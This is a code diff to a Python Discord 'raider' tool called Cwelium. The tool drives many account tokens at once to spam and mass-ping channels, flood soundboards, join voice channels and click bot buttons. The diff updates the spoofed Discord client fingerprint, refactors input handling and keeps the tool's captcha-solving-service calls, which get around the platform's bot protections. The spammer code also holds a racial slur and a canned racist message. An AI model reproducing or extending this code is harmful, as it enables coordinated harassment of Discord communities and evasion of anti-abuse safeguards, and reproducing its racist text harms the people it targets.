@@ -22,6 +22,7 @@ import threading
 import time
 import tls_client
 import uuid
+import re
 import websocket
 
 os.system('cls')
@@ -534,13 +535,13 @@ class Raider:
                 "os": "Windows",
                 "browser": "Discord Client",
                 "release_channel": "stable",
-                "client_version": "1.0.9153",
+                "client_version": "1.0.9155",
                 "os_version": "10.0.19045",
                 "system_locale": "en",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9153 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36",
-                "browser_version": "30.1.0",
-                "client_build_number": 308381,
-                "native_build_number": 49397,
+                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9155 Chrome/124.0.6367.243 Electron/30.2.0 Safari/537.36",
+                "browser_version": "30.2.0",
+                "client_build_number": 310927,
+                "native_build_number": 49817,
                 "client_event_source": None,
             }
             properties = base64.b64encode(json.dumps(payload).encode()).decode()
@@ -556,7 +557,7 @@ class Raider:
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9153 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9155 Chrome/124.0.6367.243 Electron/30.2.0 Safari/537.36",
             "x-discord-locale": "en-US",
             'x-debug-options': 'bugReporterEnabled',
             "x-super-properties": self.props,
@@ -758,7 +759,7 @@ class Raider:
     def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None):
         try:
             if message == "nigger":
-                message = "nigger hey im black im a slabe i always eat watermelon and i wanna eat yo butt"
+                message = "hey im black im a slave i always eat watermelon and i wanna eat yo butt"
             while True:
                 if massping:
                     msg = self.get_random_members(guild, int(pings))
@@ -1157,13 +1158,9 @@ class Raider:
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    def button_bypass(self, token, message_id, channel_id, guild_id, optionbutton):
+    def button_bypass(self, token, message_id, channel_id, guild_id):
         try:
-            payload = {
-                'limit': '50',
-                'around': message_id,
-            }
-
+            payload = {'limit': '50', 'around': message_id}
             response = session.get(
                 f'https://canary.discord.com/api/v9/channels/{channel_id}/messages',
                 params=payload,
@@ -1171,42 +1168,44 @@ class Raider:
             )
 
             messages = response.json()
-            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
+            message_to_click = next((msg for msg in messages if msg["id"] == message_id), None)
 
-            if messagebottoclick is None:
-                pass
+            if message_to_click is None:
+                console.log("FAILED", C["red"], "Message not found")
+                return
+            
+            buttons = [comp["components"][0] for comp in message_to_click.get("components", [])]
+            if not buttons:
+                console.log("FAILED", C["red"], "No buttons found in the message")
+                return
 
-            buttons = []
+            for button in buttons:
+                data = {
+                    "application_id": message_to_click["author"]["id"],
+                    "channel_id": channel_id,
+                    "data": {
+                        "component_type": 2,
+                        "custom_id": button["custom_id"],
+                    },
+                    "guild_id": guild_id,
+                    "message_flags": 0,
+                    "message_id": message_id,
+                    "nonce": self.nonce(),
+                    "session_id": uuid.uuid4().hex,
+                    "type": 3,
+                }
 
-            for x in messagebottoclick["components"]:
-                buttons.append(x["components"][0])
+                response = session.post(
+                    "https://canary.discord.com/api/v9/interactions",
+                    headers=self.headers(token),
+                    json=data
+                )
 
-            data = {
-                'application_id': messagebottoclick["author"]["id"],
-                'channel_id': channel_id,
-                'data': {
-                    'component_type': 2,
-                    'custom_id': buttons[int(optionbutton)]["custom_id"],
-                },
-                'guild_id': guild_id,
-                'message_flags': 0,
-                'message_id': message_id,
-                'nonce': self.nonce(),
-                'session_id': uuid.uuid4().hex,
-                'type': 3,
-            }
-
-            respons = session.post(
-                'https://canary.discord.com/api/v9/interactions',
-                headers=self.headers(token),
-                json=data
-            )
-
-            match respons.status_code:
-                case 204:
-                    console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                case _:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", respons.json().get("message"))
+                match response.status_code:
+                    case 204:
+                        console.log(f"Clicked button {button['custom_id']}", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                    case _:
+                        console.log(f"Failed to click button {button['custom_id']}", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", {response.json().get('message')})
         except Exception as e:
             console.log("FAILED", C["red"], "Failed to Click Button", e)
 
@@ -1404,6 +1403,7 @@ class Raider:
             headers = self.headers(token)
             payload = {
                 'username': nickname,
+                "discriminator": None,
             }
 
             response = session.post(
@@ -1425,7 +1425,7 @@ class Raider:
                             headers["x-captcha-key"] = solve_capsolver(site_key='b2b02ab5-7dae-4d6f-830e-7b55634c888b', page_url='https://discord.com/')
                             data = {
                                 "username": nickname,
-                                'discriminator': None,
+                                "discriminator": None,
                             }
                         elif service == "capmonster" or "Capmonster" or "CapMonster":
                             headers["x-captcha-key"] = solve_capmonster(site_key='b2b02ab5-7dae-4d6f-830e-7b55634c888b', page_url='https://discord.com/')
@@ -1437,7 +1437,7 @@ class Raider:
                             headers["x-captcha-key"] = solve_2cap(site_key='b2b02ab5-7dae-4d6f-830e-7b55634c888b', page_url='https://discord.com/')
                             data = {
                                 "username": nickname,
-                                'discriminator': None,
+                                "discriminator": None,
                             }
 
                         newresponse = session.post(
@@ -1655,13 +1655,8 @@ class Menu:
     def mass_advert(self):
         os.system('title Cwelium - Mass advertiser')
         Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
             
         channel_id = Link.split("/")[5]
         guild_id = Link.split("/")[4]
@@ -1705,13 +1700,8 @@ class Menu:
     def soundbord(self):
         os.system('title Cwelium - Soundboard Spam')
         Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
             
         channel = Link.split("/")[5]
         guild = Link.split("/")[4]
@@ -1756,13 +1746,8 @@ class Menu:
     def typier(self):
         os.system('title Cwelium - Typer')
         Link = input(console.prompt(f"Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
 
         channelid = Link.split("/")[5]
         args = [
@@ -1792,13 +1777,8 @@ class Menu:
     def voice_joiner(self):
         os.system('title Cwelium - Voice Joiner')
         Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
 
         guild = Link.split("/")[4]
         channel = Link.split("/")[5]
@@ -1815,13 +1795,8 @@ class Menu:
             Menu().main_menu()
 
         Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
 
         channel_id = Link.split("/")[5]
         args = [
@@ -1836,7 +1811,8 @@ class Menu:
         if invite == "":
             Menu().main_menu()
 
-        invite = invite.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "").replace("https://discord.com/invite/", "").replace(".gg/", "")
+        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/invite/|discord\.gg/|discord\.com/invite/|\.gg/)", "", invite)
+
         args = [
             (token, invite) for token in tokens
         ]
@@ -1858,18 +1834,15 @@ class Menu:
     def spammer(self):
         os.system('title Cwelium - Spammer')
         Link = input(console.prompt(f"Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
 
         guild_id = Link.split("/")[4]
         channel_id = Link.split("/")[5]
+
         massping = input(console.prompt("Massping", True))
         message = input(console.prompt("Message"))
+
         if message == "":
             Menu().main_menu()
 
@@ -1897,13 +1870,8 @@ class Menu:
     def reactor(self):
         os.system('title Cwelium - Reactor')
         Link = input(console.prompt("Message Link"))
-        if Link == "":
-            Menu().main_menu()
-
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
 
         channel_id = Link.split("/")[5]
         message_id = Link.split("/")[6]
@@ -1918,25 +1886,15 @@ class Menu:
     @wrapper
     def button(self):
         os.system('title Cwelium - Clicker')
-        message = input(console.prompt("Message Link"))
-        if message == "":
-            Menu().main_menu()
-
-        if message.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
-
-        print(f"{Fore.RESET}If there's 1 button {Fore.LIGHTCYAN_EX}press Enter{Fore.RESET}")
-        optionbutton = input(f"{Fore.RESET}[{Fore.LIGHTCYAN_EX}Button Option{Fore.RESET}] → ")
+        Link = input(console.prompt("Message Link"))
+        if Link == "" or not Link.startswith("https://"):
+            self.main_menu()
         
-        if optionbutton == "":
-            optionbutton = 0
-        guild_id = message.split("/")[4]
-        channel_id = message.split("/")[5]
-        message_id = message.split("/")[6]
+        guild_id = Link.split("/")[4]
+        channel_id = Link.split("/")[5]
+        message_id = Link.split("/")[6]
         args = [
-            (token, message_id, channel_id, guild_id, optionbutton) for token in tokens
+            (token, message_id, channel_id, guild_id) for token in tokens
         ]
         self.run(self.raider.button_bypass, args)
 
